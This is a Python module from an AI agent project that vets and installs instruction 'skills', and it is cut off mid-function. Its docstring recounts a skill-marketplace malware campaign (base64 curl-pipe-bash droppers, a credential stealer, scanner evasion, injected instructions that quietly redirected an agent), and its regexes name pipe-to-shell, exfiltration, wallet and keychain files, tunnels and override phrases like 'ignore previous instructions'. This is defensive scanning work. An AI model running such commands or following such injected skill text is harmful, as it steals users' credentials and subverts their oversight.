#!/usr/bin/env python3
"""jarvis_skills.py - skills Jarvis writes for itself, and skills from
elsewhere that have to earn their way in.

A "skill" is a folder with a SKILL.md in it: YAML frontmatter naming the
skill, then a Markdown body of instructions. The agent reads the name and
description of every skill at startup - about a hundred tokens each - and
loads the full body only when one is actually relevant. That is the whole
mechanism. It is also, exactly, a file of instructions that an agent will
read and follow.

WHY THE SCANNER IS THE CENTRE OF THIS MODULE
Through 2025-26 the OpenClaw skill marketplaces were used to distribute
real malware, and the details matter because they say what to look for:

  - SKILL.md files carried BASE64-ENCODED SHELL COMMANDS dressed up as
    setup steps. Decoded, they were curl-pipe-bash:
    /bin/bash -c "$(curl -fsSL http://<raw ip>/<random path>)"
  - The second stage was Atomic macOS Stealer: a fake password dialog to
    harvest the login password, then keychains, ~19 browsers' data and
    ~150 wallet types, zipped and POSTed to the attacker.
  - One skill padded its README with 22 MB of filler purely to exceed the
    marketplace scanner's size threshold and skip review.
  - Another fetched attacker-controlled data at RUN time to silently
    rewrite the affiliate links the agent recommended - no malware at all,
    just an agent quietly working for someone else.
  - Several told the user to install a "required CLI" first.

Two things follow from that list.

FIRST: the scan happens on raw bytes, BEFORE any of the text reaches a
model. You cannot ask a model to review a prompt-injection payload by
putting the payload in its context and asking politely. Every check here
is a regex over the file, not a judgement call delegated to an LLM.

SECOND: a hit at "block" severity is not askable. Most of this project's
design is "ask the human" - the gate exists for exactly that. But the
attack above works by asking the human for something that looks routine,
and a dialog saying "allow this skill to run its setup step?" is the
attack succeeding. So block-level findings refuse outright and never reach
the approval queue. Only clean-or-warn skills get that far.

THE THREE TRUST LEVELS
  self         Jarvis wrote it after doing something the hard way. Still
               scanned, because a skill written from a web page it read is
               a skill written from whatever that page said.
  local        You wrote it. Scanned, warnings shown, but you are allowed
               to do what you like on your own machine.
  third_party  Downloaded. Strictest: bundled scripts are a warning on
               their own, and nothing in scripts/ is ever executed by this
               loader. If you want one to run, run it yourself through the
               normal shell path where the gate can see it.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import json
import os
import re
import shutil
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Iterable, Optional

try:
    import jarvis_framework as fw
    _CFG_DIR = Path(fw.CONFIG_DIR)
except Exception:                                    # pragma: no cover
    fw = None
    _CFG_DIR = Path(os.path.expanduser("~/.openjarvis"))

SKILLS_DIR = Path(os.environ.get("JARVIS_SKILLS_DIR", _CFG_DIR / "skills"))
QUARANTINE = Path(os.environ.get("JARVIS_SKILLS_QUARANTINE",
                                 _CFG_DIR / "skills-quarantine"))

# The 22 MB README was not an accident. A skill that will not fit in a
# context window is not a skill, it is an evasion, so size IS a finding.
MAX_SKILL_MD = 64 * 1024          # 64 KB: ~16k tokens, far past any real skill
MAX_SKILL_DIR = 5 * 1024 * 1024   # 5 MB for the whole folder
MAX_FILES = 64

TRUST_LEVELS = ("self", "local", "third_party")


def _cfg(key: str, default):
    try:
        return fw.load_framework().get("skills", {}).get(key, default)
    except Exception:
        return default


# --------------------------------------------------------------------------
#   The frontmatter, per the open agent-skills spec
# --------------------------------------------------------------------------

_NAME_RE = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")
_FM_RE = re.compile(r"\A---[ \t]*\r?\n(.*?)\r?\n---[ \t]*\r?\n(.*)\Z", re.S)

# Fields the spec defines. Anything else is kept but reported, because an
# unknown key is how a format grows a new capability without anyone noticing.
_KNOWN_FIELDS = {"name", "description", "license", "compatibility",
                 "metadata", "allowed-tools", "version", "dependencies"}


@dataclass
class Finding:
    severity: str            # "block" | "warn" | "note"
    code: str
    message: str
    where: str = ""
    excerpt: str = ""

    def as_dict(self): return asdict(self)


@dataclass
class Skill:
    name: str
    description: str = ""
    body: str = ""
    path: Optional[Path] = None
    trust: str = "third_party"
    license: str = ""
    compatibility: str = ""
    allowed_tools: list = field(default_factory=list)
    extra_fields: dict = field(default_factory=dict)
    files: list = field(default_factory=list)
    sha256: str = ""
    installed: float = 0.0
    uses: int = 0
    notes: list = field(default_factory=list)

    def card(self) -> dict:
        """The ~100 tokens the agent carries for every skill all the time.
        The body is NOT in here - that is the whole point of the format."""
        return {"name": self.name, "description": self.description,
                "trust": self.trust, "uses": self.uses}

    def as_dict(self) -> dict:
        d = asdict(self)
        d["path"] = str(self.path) if self.path else None
        return d


class SkillError(ValueError):
    pass


def _parse_frontmatter(text: str) -> tuple[dict, str]:
    """A deliberately small YAML subset: `key: value` and simple lists.

    Using a real YAML parser here would mean handing an untrusted file to a
    parser with a much larger attack surface than this needs. Skills use
    flat string fields; anything that needs more than this is not a skill
    this loader will take.
    """
    m = _FM_RE.match(text)
    if not m:
        raise SkillError("no YAML frontmatter: a SKILL.md must start with a "
                         "--- delimited block naming the skill")
    head, body = m.group(1), m.group(2)
    out: dict[str, Any] = {}
    key = None
    for raw in head.splitlines():
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        if raw.startswith((" ", "\t")) and raw.lstrip().startswith("- ") and key:
            out.setdefault(key, [])
            if isinstance(out[key], list):
                out[key].append(raw.lstrip()[2:].strip().strip("'\""))
            continue
        if ":" not in raw:
            continue
        key, _, val = raw.partition(":")
        key = key.strip().lower()
        val = val.strip()
        if val.startswith(("'", '"')) and val.endswith(("'", '"')) and len(val) > 1:
            val = val[1:-1]
        out[key] = val if val else []
    return out, body


def parse_skill(path: Path, trust: str = "third_party") -> Skill:
    """Read and structurally validate a skill folder. Does NOT vet it."""
    path = Path(path).resolve()
    md = path / "SKILL.md"
    if not md.is_file():
        raise SkillError(f"{path} has no SKILL.md")
    size = md.stat().st_size
    if size > MAX_SKILL_MD:
        raise SkillError(
            f"SKILL.md is {size/1024:.0f} KB, over the {MAX_SKILL_MD//1024} KB "
            f"limit - padding a skill past a scanner's size threshold is a "
            f"known evasion, so an oversized one is refused rather than read")
    text = md.read_text(encoding="utf-8", errors="replace")
    fm, body = _parse_frontmatter(text)

    name = str(fm.get("name") or "").strip()
    if not name:
        raise SkillError("frontmatter has no 'name'")
    if not _NAME_RE.match(name) or len(name) > 64:
        raise SkillError(
            f"skill name {name!r} is not a valid name: lowercase letters, "
            f"digits and single hyphens only, up to 64 characters")
    if name != path.name:
        # Required by the spec, and load-bearing here: it is what stops a
        # skill called "../../jarvis_gate" from being addressable by name.
        raise SkillError(f"frontmatter name {name!r} does not match the folder "
                         f"name {path.name!r}")
    desc = str(fm.get("description") or "").strip()
    if not desc:
        raise SkillError("frontmatter has no 'description'; without one the "
                         "agent has no way to know when the skill applies")
    if len(desc) > 1024:
        raise SkillError(f"description is {len(desc)} characters, over the "
                         f"1024 the spec allows")

    files, total = [], 0
    for f in sorted(path.rglob("*")):
        if f.is_file():
            # as_posix(), not str(). str() of a WindowsPath yields
            # "scripts\\setup.bat", and every check downstream splits on "/" -
            # so on Windows, which is where this actually runs, a bundled
            # executable one directory down was not recognised as being in
            # scripts/ at all and skipped the flag it exists to raise. The
            # scanner must not be weaker on the platform it ships to.
            files.append(f.relative_to(path).as_posix())
            total += f.stat().st_size
    if len(files) > MAX_FILES:
        raise SkillError(f"{len(files)} files in the skill, over the {MAX_FILES} limit")
    if total > MAX_SKILL_DIR:
        raise SkillError(f"the skill folder is {total/2**20:.1f} MB, over the "
                         f"{MAX_SKILL_DIR//2**20} MB limit")

    tools = fm.get("allowed-tools") or []
    if isinstance(tools, str):
        tools = tools.split()

    return Skill(
        name=name, description=desc, body=body, path=path,
        trust=trust if trust in TRUST_LEVELS else "third_party",
        license=str(fm.get("license") or ""),
        compatibility=str(fm.get("compatibility") or ""),
        allowed_tools=list(tools),
        extra_fields={k: v for k, v in fm.items() if k not in _KNOWN_FIELDS},
        files=files,
        sha256=hashlib.sha256(text.encode("utf-8", "replace")).hexdigest(),
    )


# --------------------------------------------------------------------------
#   The scanner - every pattern here is one that was actually used
# --------------------------------------------------------------------------

# (a) curl/wget straight into a shell. The exact shape of the OpenClaw
#     dropper: /bin/bash -c "$(curl -fsSL http://<ip>/<path>)"
_PIPE_TO_SHELL = re.compile(
    r"(?:curl|wget|iwr|invoke-webrequest)\b[^\n|;`]{0,200}"
    r"(?:\|\s*(?:sudo\s+)?(?:ba|z|k|fi)?sh\b|\|\s*(?:python3?|perl|node)\b)"
    r"|(?:ba|z)?sh\s+-c\s*[\"']?\$\(\s*(?:curl|wget)\b"
    r"|\$\(\s*(?:curl|wget)\b[^)]{0,200}\)\s*\|\s*(?:ba|z)?sh"
    r"|iex\s*\(\s*(?:new-object|iwr|invoke-webrequest)", re.I)

# (b) a literal IP address as a download source. Legitimate software is
#     distributed from names, not from 91.92.242.30.
_RAW_IP_URL = re.compile(
    r"https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/\S*)?", re.I)

# (c) shell that decodes something and runs it. The encoding IS the tell:
#     there is no honest reason to base64 a setup step.
_DECODE_AND_RUN = re.compile(
    r"base64\s+(?:-d|--decode|-D)[^\n]{0,80}\|\s*(?:ba|z)?sh"
    r"|echo\s+[A-Za-z0-9+/=]{40,}\s*\|\s*base64"
    r"|FromBase64String|atob\s*\(|python3?\s+-c\s*[\"'].{0,40}b64decode", re.I)

# (d) asking the human for a credential. The stealer's first move was a
#     fake password dialog; a skill has no business collecting one.
_ASKS_FOR_SECRET = re.compile(
    r"(?:enter|type|provide|paste|supply|input)\s+(?:your\s+|the\s+)?"
    r"(?:login\s+|user\s+|admin\s+|sudo\s+|master\s+)?"
    r"(?:password|passphrase|seed\s*phrase|recovery\s*phrase|private\s*key|"
    r"api\s*key|secret\s*key|credentials?|2fa|mfa\s*code)", re.I)

# (e) the files a stealer goes for. A skill that names your keychain, your
#     wallet or your browser profile is telling you what it is for.
_TOUCHES_SECRETS = re.compile(
    r"\.ssh/id_[a-z0-9_]+|id_rsa\b|\.aws/credentials|\.netrc\b"
    r"|login\.keychain|security\s+(?:find-generic-password|dump-keychain)"
    r"|(?:Login\s+Data|Local\s+State|cookies\.sqlite|key[34]\.db)\b"
    r"|wallet\.dat|keystore\b|MetaMask|Exodus|Electrum"
    r"|\.env\b[^\n]{0,40}(?:cat|curl|post|upload|send)", re.I)

# (f) exfiltration: a POST of local data to somewhere that is not you.
_EXFIL = re.compile(
    r"curl\b[^\n]{0,200}(?:-d|--data|-F|-T|--upload-file)[^\n]{0,200}https?://"
    r"|(?:zip|tar)\b[^\n]{0,120}\|\s*curl"
    r"|requests\.post\s*\([^\n]{0,120}(?:open\(|read\(\)|files=)", re.I)

# (g) "install this prerequisite first" - how the fake OpenClawCLI landed.
_PREREQ_INSTALL = re.compile(
    r"(?:first|before\s+(?:you\s+)?(?:begin|start|continue|using)|required|"
    r"prerequisite|you\s+must)[^\n]{0,80}\b(?:install|download|run)\b"
    r"[^\n]{0,120}(?:https?://|\.sh\b|\.pkg\b|\.dmg\b|\.exe\b|\.msi\b)", re.I)

# (h) fetching instructions at RUN time. The affiliate-rewriting skill had
#     no malware in it at all - it just asked a server what to say.
_RUNTIME_FETCH = re.compile(
    r"(?:fetch|retrieve|download|load|get)\s+(?:the\s+)?"
    r"(?:latest\s+|current\s+|updated\s+)?"
    r"(?:instructions?|rules?|config(?:uration)?|prompt|list|data|template)"
    r"\s+from\s+https?://", re.I)

# (i) telling the agent to ignore the rules it came with.
_OVERRIDE = re.compile(
    r"ignore\s+(?:all\s+|any\s+)?(?:previous|prior|earlier|above|system)\s+"
    r"(?:instructions?|prompts?|rules?|messages?)"
    r"|disregard\s+(?:your\s+|the\s+)?(?:instructions?|guidelines?|safety|rules?)"
    r"|do\s+not\s+(?:ask|tell|inform|mention|log|report)\s+(?:the\s+)?(?:user|human|owner)"
    r"|without\s+(?:asking|informing|notifying|telling)\s+(?:the\s+)?(?:user|human|owner)"
    r"|(?:skip|bypass|disable)\s+(?:the\s+)?(?:approval|confirmation|gate|permission|sandbox)",
    re.I)

# (j) naming this project's own governance files.
_TOUCHES_JARVIS = re.compile(
    r"jarvis-framework\.toml|jarvis_gate\.py|jarvis_framework\.py|approvals\.db"
    r"|patch_openjarvis\.py|jarvis_router\.py|autonomy\.tiers", re.I)

# (k) a tunnel. Permanently forbidden in this build, so it is not a warning.
_TUNNEL = re.compile(
    r"\bngrok\b|\bcloudflared\b|\blocaltunnel\b|\bbore\b|\bserveo\b"
    r"|tailscale\s+(?:funnel|serve)\b|ssh\s+-[a-zA-Z]*R\b", re.I)

_RULES = [
    ("block", "pipe_to_shell",    _PIPE_TO_SHELL,
     "downloads something and pipes it straight into a shell - this is the exact "
     "shape of the OpenClaw dropper and there is no safe version of it"),
    ("block", "decode_and_run",   _DECODE_AND_RUN,
     "decodes encoded text and runs it; encoding a setup step is how the payload "
     "got past review, and no honest instruction needs to be base64"),
    ("block", "exfiltration",     _EXFIL,
     "uploads local files or data to a remote server"),
    ("block", "asks_for_secret",  _ASKS_FOR_SECRET,
     "asks you to type a password, key or seed phrase - the stealer's first move "
     "was a dialog that looked exactly like this"),
    ("block", "override_rules",   _OVERRIDE,
     "tells the agent to ignore its own rules, skip approval, or act without "
     "telling you"),
    ("block", "touches_jarvis",   _TOUCHES_JARVIS,
     "names this project's own governance files, which no skill has any reason to"),
    ("block", "tunnel",           _TUNNEL,
     "opens a public tunnel, which is set to never in your framework"),
    ("warn",  "raw_ip_url",       _RAW_IP_URL,
     "downloads from a bare IP address rather than a domain"),
    ("warn",  "touches_secrets",  _TOUCHES_SECRETS,
     "reads keychains, wallets, browser profiles or credential files"),
    ("warn",  "prerequisite",     _PREREQ_INSTALL,
     "tells you to install something before it will work - the malicious skills "
     "did this to get a fake CLI onto the machine"),
    ("warn",  "runtime_fetch",    _RUNTIME_FETCH,
     "fetches its instructions from a server while running, so what it does can "
     "change after you approved it"),
]


def _excerpt(text: str, m: re.Match) -> tuple[str, str]:
    line_no = text.count("\n", 0, m.start()) + 1
    frag = text[max(0, m.start() - 30): m.end() + 40].replace("\n", " ")
    return f"line {line_no}", frag.strip()[:160]


def scan_text(text: str, where: str = "SKILL.md") -> list[Finding]:
    """Regex over raw bytes. Never asks a model anything - the text being
    scanned is precisely the text you must not put in a model's context and
    then ask for an opinion about."""
    out = []
    # Normalise before looking. Instructions hidden in Unicode Tag characters,
    # keywords split by zero-width joiners, and look-alike letters all pass a
    # regex over raw text; they do not pass a regex over NFKC-folded text with
    # the invisible characters removed. The stripped characters and any text
    # they spelled out are reported as findings of their own.
    try:
        import jarvis_content_risk as _cr
        n = _cr.normalise(text)
    except Exception:                                    # pragma: no cover
        n = None
    if n is not None:
        text = n.text
        if n.tags:
            out.append(Finding("block", "hidden_tags",
                               f"contains {n.tags} invisible Unicode Tag characters that "
                               f"spell out text a person cannot see",
                               where, n.hidden[:160]))
            for severity, code, rx, msg in _RULES:
                if rx.search(n.hidden):
                    out.append(Finding("block", f"hidden_{code}",
                                       f"hidden in invisible characters, this {msg}",
                                       f"{where} (hidden)", n.hidden[:160]))
                    break
        if n.bidi:
            out.append(Finding("warn", "bidi_override",
                               f"contains {n.bidi} bidirectional control characters, "
                               f"which can make text display in a different order than "
                               f"it is read", where))
        if n.zero_width >= 3:
            out.append(Finding("warn", "zero_width",
                               f"contains {n.zero_width} zero-width characters, which "
                               f"can split a word so a scanner misses it", where))
    for severity, code, rx, msg in _RULES:
        for m in rx.finditer(text):
            loc, frag = _excerpt(text, m)
            out.append(Finding(severity, code, msg, f"{where} {loc}", frag))
            break                       # one finding per rule is enough to act on
    # Long unbroken base64-looking runs, decoded and re-scanned. The payload
    # hid one layer down, so one layer down is where to look.
    for m in re.finditer(r"[A-Za-z0-9+/]{44,}={0,2}", text):
        try:
            dec = base64.b64decode(m.group(0) + "==", validate=False)
            s = dec.decode("utf-8", "ignore")
        except (binascii.Error, ValueError):
            continue
        if len(s) < 16 or sum(c.isprintable() for c in s) < len(s) * 0.8:
            continue
        for severity, code, rx, msg in _RULES:
            if rx.search(s):
                loc, _ = _excerpt(text, m)
                out.append(Finding("block", f"encoded_{code}",
                                   f"hidden inside base64, this {msg}",
                                   f"{where} {loc}", s[:160]))
                break
    return out


EXEC_SUFFIXES = (".sh", ".ps1", ".bat", ".cmd", ".py", ".js",
                 ".exe", ".dll", ".dmg", ".pkg", ".msi")


def is_bundled_script(rel: str) -> bool:
    """Is this file in the skill an executable the loader must flag?

    Split on BOTH separators. parse_skill normalises to posix, so a backslash
    should never reach here - but this predicate is the security boundary, and
    a boundary that is correct only because something upstream stayed correct
    is one refactor away from being wrong. The cost of the second separator is
    nothing; the cost of missing a bundled script on Windows is the whole
    point of the scanner.
    """
    head = rel.replace("\\", "/").split("/")[0]
    return head == "scripts" or rel.lower().endswith(EXEC_SUFFIXES)


def vet(skill: Skill) -> dict:
    """Scan a parsed skill. Returns a verdict and every finding behind it."""
    findings = scan_text(skill.body, "SKILL.md")
    findings += [Finding("note", "extra_field",
                         f"frontmatter field {k!r} is not in the skill spec", "SKILL.md")
                 for k in skill.extra_fields]

    # Bundled executables. Never run by this loader, whatever the verdict.
    scripts = [f for f in skill.files if is_bundled_script(f)]
    if scripts:
        sev = "warn" if skill.trust == "third_party" else "note"
        findings.append(Finding(
            sev, "bundled_scripts",
            f"ships {len(scripts)} executable file(s) ({', '.join(scripts[:4])}"
            f"{'...' if len(scripts) > 4 else ''}). Nothing here runs them - if "
            f"you want one to run, run it yourself so the gate sees it",
            "skill folder"))
        if skill.path:
            for rel in scripts:
                f = skill.path / rel
                try:
                    if f.stat().st_size < 256 * 1024:
                        findings += scan_text(
                            f.read_text(encoding="utf-8", errors="replace"), rel)
                except OSError:
                    pass

    if skill.trust == "third_party" and not skill.license:
        findings.append(Finding("note", "no_license",
                                "no license field; fine for your own use, worth "
                                "knowing before you share it", "SKILL.md"))

    blocks = [f for f in findings if f.severity == "block"]
    warns = [f for f in findings if f.severity == "warn"]
    verdict = "refuse" if blocks else ("review" if warns else "clean")
    return {"skill": skill.name, "trust": skill.trust, "verdict": verdict,
            "findings": [f.as_dict() for f in findings],
            "blocking": len(blocks), "warnings": len(warns),
            "sha256": skill.sha256,
            "summary": _summary(skill, verdict, blocks, warns)}


def _summary(skill: Skill, verdict: str, blocks: list, warns: list) -> str:
    if verdict == "refuse":
        return (f"{skill.name} was refused. It " +
                "; and it ".join(b.message for b in blocks[:3]) +
                ". A skill that does any of these is not made safe by you "
                "approving it, so you were not asked.")
    if verdict == "review":
        return (f"{skill.name} looks usable but " +
                "; it also ".join(w.message for w in warns[:3]) +
                ". Read it before you say yes.")
    return f"{skill.name} is clean: nothing in it matches a known attack pattern."


# --------------------------------------------------------------------------
#   Installing - the gate, but with a floor under it
# --------------------------------------------------------------------------

INDEX = SKILLS_DIR / ".index.json"


def _gate(action: str, detail: dict, prompt: str):
    try:
        import jarvis_gate
    except Exception as exc:                              # pragma: no cover
        class _No:
            allowed, tier, reason = False, "unknown", f"gate unavailable ({exc})"
        return _No()
    return jarvis_gate.check(action, detail=detail, prompt=prompt)


def _read_index() -> dict:
    try:
        return json.loads(INDEX.read_text("utf-8"))
    except Exception:
        return {}


def _write_index(ix: dict) -> bool:
    try:
        INDEX.parent.mkdir(parents=True, exist_ok=True)
        tmp = INDEX.with_suffix(".tmp")
        tmp.write_text(json.dumps(ix, indent=2), "utf-8")
        os.replace(tmp, INDEX)
        return True
    except Exception:
        return False


def _safe_dest(name: str) -> Path:
    """Where a skill called `name` is allowed to live, and nowhere else."""
    if not _NAME_RE.match(name) or len(name) > 64:
        raise SkillError(f"unsafe skill name {name!r}")
    dest = (SKILLS_DIR / name).resolve()
    root = SKILLS_DIR.resolve()
    if dest == root or root not in dest.parents:
        raise SkillError(f"{name!r} would land outside the skills folder")
    return dest


def install(source: Path, trust: str = "third_party",
            accept_warnings: bool = False) -> dict:
    """Vet a skill folder and, if it survives, copy it in.

    Gated as `modify_own_code` - tier "ask" - because a skill is
    instructions the agent will follow, which is a change to how it behaves
    whatever the file extension says.

    The floor under the gate: a "refuse" verdict never reaches the approval
    queue. The attack being defended against works by producing a dialog
    that looks routine, so an approval prompt for a curl-pipe-bash skill is
    not a safeguard - it is the last step of the exploit.
    """
    source = Path(source).resolve()
    try:
        skill = parse_skill(source, trust=trust)
    except SkillError as exc:
        return {"ok": False, "reason": str(exc), "verdict": "malformed"}

    report = vet(skill)
    if report["verdict"] == "refuse":
        _quarantine(source, skill.name, report)
        return {"ok": False, "installed": False, "report": report,
                "reason": report["summary"],
                "asked": False,           # deliberately: see the docstring
                "quarantined": True}

    if report["verdict"] == "review" and not accept_warnings:
        return {"ok": False, "installed": False, "report": report,
                "needs": "accept_warnings",
                "asked": False,
                "reason": report["summary"] + " Pass accept_warnings once you have."}

    v = _gate("modify_own_code",
              {"skill": skill.name, "trust": skill.trust,
               "files": len(skill.files), "sha256": skill.sha256,
               "verdict": report["verdict"], "warnings": report["warnings"]},
              prompt=(f"Install the skill {skill.name!r} ({skill.trust})? "
                      f"{skill.description[:200]}"))
    if not getattr(v, "allowed", False):
        return {"ok": False, "installed": False, "report": report,
                "asked": True, "reason": getattr(v, "reason", "refused")}

    try:
        dest = _safe_dest(skill.name)
        if dest.exists():
            shutil.rmtree(dest)
        SKILLS_DIR.mkdir(parents=True, exist_ok=True)
        shutil.copytree(source, dest)
    except Exception as exc:
        return {"ok": False, "installed": False, "report": report,
                "reason": f"could not copy the skill in ({exc})"}

    _pin_skill(skill)
    ix = _read_index()
    ix[skill.name] = {"trust": skill.trust, "sha256": skill.sha256,
                      "description": skill.description,
                      "installed": time.time(), "uses": 0,
                      "verdict": report["verdict"], "notes": []}
    _write_index(ix)
    return {"ok": True, "installed": True, "skill": skill.name,
            "report": report, "asked": True,
            "reason": f"{skill.name} installed"}


def _quarantine(source: Path, name: str, report: dict) -> Optional[Path]:
    """Keep a refused skill, out of the load path, so you can look at what
    was actually in it. Deleting evidence is its own kind of failure."""
    try:
        QUARANTINE.mkdir(parents=True, exist_ok=True)
        dest = QUARANTINE / f"{re.sub(r'[^a-z0-9-]', '_', name.lower())}-{int(time.time())}"
        shutil.copytree(source, dest)
        (dest / "_why-refused.json").write_text(json.dumps(report, indent=2), "utf-8")
        return dest
    except Exception:
        return None


def uninstall(name: str) -> dict:
    """Removing a skill needs no approval. Taking a capability away cannot
    be the dangerous direction."""
    try:
        dest = _safe_dest(name)
    except SkillError as exc:
        return {"ok": False, "reason": str(exc)}
    if not dest.is_dir():
        return {"ok": False, "reason": f"no skill called {name}"}
    try:
        shutil.rmtree(dest)
    except Exception as exc:
        return {"ok": False, "reason": f"could not remove it ({exc})"}
    ix = _read_index()
    ix.pop(name, None)
    _write_index(ix)
    try:
        import jarvis_content_risk as _cr
        _cr.unpin("skill", name)
    except Exception:
        pass
    return {"ok": True, "reason": f"{name} removed"}


def _pin_skill(skill: "Skill") -> None:
    """Record the approved body, normalised, so a later change can be
    measured and diffed rather than only detected."""
    try:
        import jarvis_content_risk as _cr
        _cr.pin("skill", skill.name, _cr.normalise(skill.body).text)
    except Exception:
        pass


def _skill_drift(skill: "Skill") -> Optional[dict]:
    """How far the body has moved from what was approved: a ratio, the
    cumulative ratio across re-approvals, a unified diff, and whether the
    cumulative drift has passed the point where a diff is no longer an
    honest basis for saying yes again."""
    try:
        import jarvis_content_risk as _cr
        return _cr.check_pin("skill", skill.name, _cr.normalise(skill.body).text).as_dict()
    except Exception:
        return None


# --------------------------------------------------------------------------
#   Loading - progressive disclosure, and re-checking on the way in
# --------------------------------------------------------------------------

def cards() -> list[dict]:
    """Name and description for every installed skill: the ~100 tokens each
    that the agent carries all the time. No bodies. Carrying the bodies
    would defeat the format and fill the context with instructions for
    tasks that are not happening."""
    ix = _read_index()
    out = []
    for name, row in sorted(ix.items()):
        out.append({"name": name, "description": row.get("description", ""),
                    "trust": row.get("trust", "third_party"),
                    "uses": row.get("uses", 0),
                    # The notes go with the body into the model's context on
                    # every load(), so they steer answers. Anything that steers
                    # an answer has to be readable by the owner, and this is
                    # the only surface that lists skills at all. Sending them
                    # is what makes the pool inspectable rather than a private
                    # store of self-authored heuristics.
                    "notes": row.get("notes", [])})
    return out


def load(name: str, mark_use: bool = True) -> dict:
    """The full body, for a skill the agent has decided is relevant.

    Re-vetted and re-hashed on every load, not only at install. A file on
    disk can change after you approved it - by an editor, by a sync client,
    by anything else on the machine - and the load path is the last place
    to notice before the text becomes instructions.
    """
    try:
        dest = _safe_dest(name)
    except SkillError as exc:
        return {"ok": False, "reason": str(exc)}
    if not (dest / "SKILL.md").is_file():
        return {"ok": False, "reason": f"no skill called {name}"}

    ix = _read_index()
    row = ix.get(name, {})
    try:
        skill = parse_skill(dest, trust=row.get("trust", "third_party"))
    except SkillError as exc:
        return {"ok": False, "reason": f"{name} no longer parses: {exc}"}

    if row.get("sha256") and skill.sha256 != row["sha256"]:
        # The verdict comes from scanning the FULL current text, never the
        # delta: a diff is stateless, and twenty benign-looking changes can
        # sum to a hostile whole. The diff is attached for the eye.
        report = vet(skill)
        drift = _skill_drift(skill)
        if report["verdict"] == "refuse":
            return {"ok": False, "changed": True, "report": report, "drift": drift,
                    "reason": f"{name} has changed since you approved it, and the "
                              f"new version is refused: {report['summary']}"}
        return {"ok": False, "changed": True, "report": report, "drift": drift,
                "reason": f"{name} has changed on disk since you approved it. "
                          + ("Enough has changed since you first approved it that "
                             "you should read the whole thing again, not the diff. "
                             if (drift or {}).get("needs_full_reread") else "")
                          + "Re-install it to confirm the new version."}

    if mark_use:
        row["uses"] = int(row.get("uses", 0)) + 1
        row["last_used"] = time.time()
        ix[name] = row
        _write_index(ix)
    return {"ok": True, "name": name, "trust": skill.trust,
            "description": skill.description, "body": skill.body,
            "notes": row.get("notes", []),
            "bundled_files": [f for f in skill.files if f != "SKILL.md"],
            "note": ("Bundled files are NOT executed by the skill loader. If this "
                     "skill tells you to run one, that is a normal shell call and "
                     "goes through the gate like any other."
                     if len(skill.files) > 1 else "")}


# --------------------------------------------------------------------------
#   Writing one - the self-improving half
# --------------------------------------------------------------------------

_TEMPLATE = """---
name: {name}
description: {description}
license: personal-use
---

# {title}

{body}
"""


def write_skill(name: str, description: str, body: str,
                trust: str = "self") -> dict:
    """Jarvis writes down how it did something, so the next time is cheaper.

    Scanned like anything else, and this is not paranoia about its own
    output: a skill written straight after reading a web page is a skill
    written from whatever that page said. The injection does not care which
    process typed the file.
    """
    name = str(name or "").strip().lower().replace(" ", "-")
    name = re.sub(r"[^a-z0-9-]", "", name).strip("-")
    name = re.sub(r"-{2,}", "-", name)
    if not name or not _NAME_RE.match(name):
        return {"ok": False, "reason": "could not make a valid skill name from that"}
    description = " ".join(str(description or "").split())[:1024]
    if not description:
        return {"ok": False, "reason": "a skill needs a description saying when "
                                       "it applies, or it will never be chosen"}

    text = _TEMPLATE.format(name=name, description=description,
                            title=name.replace("-", " ").title(), body=body)
    if len(text.encode("utf-8")) > MAX_SKILL_MD:
        return {"ok": False, "reason": "the skill is too long; split it, or move "
                                       "the detail into a references/ file"}
    findings = scan_text(body, "SKILL.md")
    blocking = [f.as_dict() for f in findings if f.severity == "block"]
    if blocking:
        return {"ok": False, "reason": "refusing to write a skill containing "
                                       + blocking[0]["message"],
                "findings": blocking}

    v = _gate("modify_own_code",
              {"skill": name, "trust": trust, "self_authored": True,
               "bytes": len(text)},
              prompt=f"Write a new skill {name!r}? {description[:200]}")
    if not getattr(v, "allowed", False):
        return {"ok": False, "reason": getattr(v, "reason", "refused")}

    try:
        dest = _safe_dest(name)
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "SKILL.md").write_text(text, "utf-8")
    except Exception as exc:
        return {"ok": False, "reason": f"could not write it ({exc})"}

    ix = _read_index()
    ix[name] = {"trust": trust, "description": description,
                "sha256": hashlib.sha256(text.encode("utf-8")).hexdigest(),
                "installed": time.time(), "uses": 0, "verdict": "clean",
                "notes": []}
    _write_index(ix)
    return {"ok": True, "skill": name, "path": str(dest),
            "reason": f"wrote {name}"}


def refine(name: str, note: str) -> dict:
    """Record what was learned the last time a skill was used.

    Notes accumulate separately from the body rather than being edited into
    it. A skill that rewrites its own instructions every run drifts, and
    there is no version of it you can point at and say "that is the one I
    approved". The body is what you approved; the notes are what happened.
    """
    note = " ".join(str(note or "").split())[:400]
    if not note:
        return {"ok": False, "reason": "empty note"}
    # Gated, like write_skill() beside it. A note is not the body, but load()
    # returns it WITH the body, so it reaches the prompt and changes what the
    # skill does next time - and unlike the body, nothing approved it and no
    # surface showed it. That is a store of self-authored heuristics that
    # steers behaviour and the owner cannot read: the shape this product's
    # rules exist to forbid, sitting inside the module that otherwise enforces
    # them best. Nothing calls refine() today, which is why it survived; the
    # gate is here so that stays true when something does.
    v = _gate("modify_own_code",
              {"skill": name, "note": note},
              f"Jarvis wants to note this against the {name} skill, which it "
              f"will read every time it uses it:\n\n{note}")
    # `allowed` is not the same question as "a human decided".
    #
    # jarvis_gate.check returns allowed=True on tier `notify` with the reason
    # "tier is notify; you were told after", and on `auto` with no human in the
    # loop at all. The default is right - modify_own_code is unlisted, and
    # UNKNOWN_TIER is "ask" - but a jarvis-framework.toml that lists it as
    # notify would turn this gate into a rubber stamp, which is exactly the
    # shape the comment above says this exists to prevent. So name the tiers
    # that mean a person answered, rather than trusting a boolean that has a
    # broader meaning than the one wanted here.
    tier = getattr(v, "tier", "unknown")
    if tier not in ("ask", "never"):
        return {"ok": False, "tier": tier,
                "reason": f"a skill note needs a person to answer for it, and "
                          f"modify_own_code is tier {tier!r}. Set it to 'ask' "
                          f"in jarvis-framework.toml, or to 'never' to refuse "
                          f"these outright."}
    if not getattr(v, "allowed", False):
        return {"ok": False, "reason": getattr(v, "reason", "refused"),
                "tier": tier}
    if [f for f in scan_text(note, "note") if f.severity == "block"]:
        return {"ok": False, "reason": "that note contains something the scanner "
                                       "refuses to store in a skill"}
    ix = _read_index()
